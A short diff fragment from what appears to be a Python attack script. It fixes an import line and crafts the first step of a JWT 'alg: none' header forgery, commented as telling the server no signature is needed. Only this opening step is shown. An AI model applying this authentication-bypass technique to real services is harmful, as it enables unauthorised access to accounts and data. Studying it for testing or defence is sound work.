@@ -1,4 +1,4 @@
-check import base64, json
+import base64, json
 
 # Step 1: Craft the header — tell the server "no signature needed"
 header = json.dumps({"alg": "none", "typ": "JWT"}).encode()
